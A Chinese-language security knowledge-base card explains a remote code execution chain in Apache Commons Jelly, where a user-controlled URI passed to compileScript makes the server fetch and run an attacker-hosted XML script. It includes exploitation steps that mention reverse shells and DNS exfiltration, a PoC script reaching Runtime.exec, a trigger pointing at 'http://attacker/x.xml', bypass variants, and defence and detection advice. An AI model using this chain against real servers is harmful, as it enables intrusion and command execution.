---
id: web-java-expression-jelly-compilescript-remote-url-script-rce
title: JellyContext.compileScript 直接接收远程 URL：服务端按攻击者给的地址拉取 XML 脚本，getXMLReader().parse 解析后 Script.run 执行 jelly:core 危险标签导致 RCE
type: scenario
domain: web
path: web/java/expression
technique: jelly-compilescript-remote-url-to-rce
tags:
- web
- java
- jelly
- apache-commons
- rce
- ssti
- xml
- template-injection
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W6
  verified_at: '2026-11-09T00:33:35+08:00'
  notes: 已对照原文核对；compileScript(uri)→getResourceAsStream→XMLParser.parse→getXMLReader().parse(InputSource)→script.compile()/run 的调用链、XMLParser.parse 中 fileName=getCurrentURI() 的上下文设置、Script.run 对 DynaTag/ConvertingWrapDynaBean 的属性求值与 doTag 执行、invokeStatic+invoke+arg 落到 Runtime.exec 的最小脚本，均与正文代码与文字一致；本次核对未读取图片，9 张图（调用栈与调试截图）未读图核对。卡片把差异点定位在「脚本来源（URL）可控」而非「脚本内容可控」，依据是正文示例 compileScript 传入 http://127.0.0.1:8888/2.xml 与国诚杯题目把请求参数 uri 直接传入 compileScript，属正文可支撑的推断而非原文断言，故保留 confidence=medium；正文对「相对路径随 fileName 绑到攻击者服务器」只给出 getCurrentURI 赋值这一段代码，卡片的「可多层拆分脚本树」是据此展开的分析，未在真实环境验证；该题核心绕过（黑名单禁用 invokeStatic/invoke/new/set 后用 getStatic 加 ${} 表达式）已被 verified 卡 web-java-expression-jelly-core-tag-jexl-injection-rce 覆盖，本卡不重复。原文未声明受影响版本、无 CVE，未 set-versions（卡片「版本不限定，行为一致」不构成版本区间）。未执行文中命令或 PoC，未访问文中 URL
url: /docs/web/java/expression/web-java-expression-jelly-compilescript-remote-url-script-rce/
draft: false
kb_aliases:
- Jelly 远程脚本加载
- compileScript URL 注入
- getResourceAsStream 拉取远程 XML
- Jelly 模板外链 RCE
- XML 脚本即代码
---

## 一句话结论

若应用把用户可控的字符串直接传给 `JellyContext.compileScript(uri)`，Jelly 会把它当成资源定位符（支持 `http://` 远程地址），用 `getResourceAsStream` 拉取该 XML、交给 `XMLParser.parse` → `getXMLReader().parse(new InputSource(in))` 解析成 `Script`，再 `script.run(context, output)` 执行；因此攻击者只要让服务端去取自己托管的 XML 脚本，就能用 `jelly:core` 的 `invokeStatic` + `invoke` 直接执行命令，形成「远程脚本源 + 模板执行」的完整 RCE 链，且执行发生在服务端而非攻击者浏览器。

## 原理

- `compileScript(String uri)` 的实现是 `getXMLParser()` 拿到带上下文的解析器后调 `getResourceAsStream(uri)`；该方法继承自 `JellyContext`，内部经 `Resource`/`URL` 解析，所以 `uri` 既可以是 classpath 相对路径，也可以是 `http://`、`file://` 之类的绝对 URL。这意味着「脚本来源」由入参单方面决定，没有白名单也没有来源校验。
- 解析阶段 `XMLParser.parse` 先 `ensureConfigured()`，再 `this.fileName = this.getCurrentURI()`，最后 `getXMLReader().parse(new InputSource(input))`，把元素名、属性表达式、命名空间上下文编译成 `Script`。这一步只是构建语法树，真正的执行在 `Script.run`。
- `Script.run` 遍历标签树：对 `DynaTag` 走 `dynaTag.setAttribute(name, value)`，其中非 `Expression` 类型属性会先 `expression.evaluateRecurse(context)` 求值再写入；对普通 tag 则走 `ConvertingWrapDynaBean` + `DynaProperty` 类型转换。求值走 `JexlExpression#evaluate`，`${...}` 表达式由此获得反射能力。
- 执行阶段 `tag.doTag(output)` 被调用；`ToTag` 负责把标签体求值结果放进 `this.instance`，`ArgTag.doTag` 再通过 `parent.addArgument(klass, this.value)` 把参数与类型注册进父节点 `InvokeTag`，最终 `InvokeTag` 以反射方式完成方法调用。整条 `invokeStatic`（取 `Runtime`）+ `invoke`（`exec`）+ `arg`（命令）的链路因此能落到 `Runtime.exec`。
- 攻击链的成立不依赖应用自身有危险代码，只依赖「脚本来源可控」这一点：远程 XML 的内容由攻击者完全决定，标签库默认包含 `jelly:core`，所以最小脚本即可 RCE。
- **解析上下文会把相对路径也绑到攻击者服务器**：`XMLParser.parse` 在解析前执行 `this.fileName = this.getCurrentURI()`，也就是说「当前脚本 URL」会成为后续解析的基准。若脚本里再用 `<j:include>` 或带相对 `uri` 的标签库定义，被包含的脚本会相对攻击者那个地址解析，等于攻击者可以在自己的服务器上继续拆分多层脚本（把危险标签分散到不同文件、逐层加载），不需要目标本地可写任何文件。这是「来源可控」比「内容可控」更严重的地方：攻击者拿到的是一条可持续供给的脚本树，而不是一次性字符串。
- **标签名到类的映射是固定的**：`<j:invokeStatic>`→`InvokeStaticTag`、`<j:invoke>`→`InvokeTag`、`<j:new>`→`NewTag`、`<j:arg>`→`ArgTag`、`<j:set>`→`SetTag`、`<j:useBean>`→`UseBeanTag`，全部来自默认标签库 `jelly:core`，不依赖目标是否额外注册了自定义库；因此只要默认库没被裁剪，最小脚本就能落到反射调用。补充约束：被调用的类与方法必须是 `public`，私有成员不能用这条链直接触达（需要另配反射 gadget）。

## 触发条件

- 应用调用 `JellyContext.compileScript(uri)` 且 `uri` 部分或全部来自请求参数、配置项、模板字段等可控输入。
- 服务端能出网访问攻击者托管的 XML（或攻击者能用 `file://`/内网地址让服务端读取可控文件）。
- 标签库未被收敛（默认含 `jelly:core`），JEXL 未禁用，`JellyContext` 能力未收窄。
- 目标 classpath 中存在 commons-jelly 依赖（版本不限定，行为一致）。
- 注意与「只控制脚本内容」的场景区分：本链的入口是**资源定位符**，即使目标不允许上传/编辑任何文件，只要它把参数当资源名传进 `compileScript`，攻击者仍能从自己服务器供脚本；反之若目标只允许在固定目录内写脚本文件，那属于内容可控而非来源可控。

## 利用步骤

1. 定位输入点：审计/黑盒寻找接受 URL 或资源路径参数并进入 `compileScript` 的入口（导入模板、加载配置脚本、预览功能）。
2. 在攻击者可控的 HTTP 服务上放置最小 Jelly 脚本：`<j:jelly xmlns:j="jelly:core">` 内先 `invokeStatic` 取 `Runtime.getRuntime`，再 `invoke exec` 带 `arg`。
3. 让目标以该 URL 调用 `compileScript`；观察是否发起对攻击者服务的 GET（证明服务端真的去取了远程脚本，同时排除 SSRF-only 的可能）。
4. 用无回显但有副作用的命令验证执行（写文件、DNS 外带、反弹 shell），确认 `Runtime.exec` 被调到。
5. 若被拦，改成 `new` 实例化 `ProcessBuilder` 后 `start`，或把表达式塞进标签属性走 JEXL 求值路径。

## PoC

攻击者托管的远程脚本（最小 RCE）：

```xml
<j:jelly xmlns:j="jelly:core" xmlns:util="jelly:util">
  <j:invokeStatic className="java.lang.Runtime" method="getRuntime" var="runtime"/>
  <j:invoke on="${runtime}" method="exec">
    <j:arg value="id"/>
  </j:invoke>
</j:jelly>
```

服务端触发点（`uri` 来自可控输入）：

```java
JellyContext context = new JellyContext();
Script script = context.compileScript(uri);          // uri = http://attacker/x.xml
script.run(context, XMLOutput.createXMLOutput(System.out));
```

## 变体与关联

- 来源变体：`http(s)://` 远程、`file://` 读本地可控文件、内网地址（把「脚本来源」当成 SSRF 用）。
- 执行面变体：`invokeStatic`+`invoke`；`new`+`invoke start`；`set`/`setProperties` 触发 setter 走 JNDI；属性内 `${}` 表达式直接反射。
- 关联：[[web-java-expression-jelly-core-tag-jexl-injection-rce]]（同组件同 sink 的标签/JEXL 面全景卡）。

## 检测与防御

- **代码层**：`compileScript` 的入参必须是固定常量或白名单内的资源名，禁止直接来自请求；对 `Resource` 解析限制协议（禁 `http`/`file`）与主机白名单。
- **标签层**：收敛标签库，移除 `invokeStatic`/`invoke`/`new`/`setProperties` 等危险标签；禁用或沙箱化 JEXL。
- **检测**：应用进程对外的异常 HTTP 请求（拉取 XML）、`getResourceAsStream` 访问外部 URL、`compileScript` 入参含 `://`、`URLClassLoader`/`Runtime.exec` 与 Jelly 解析同栈出现。
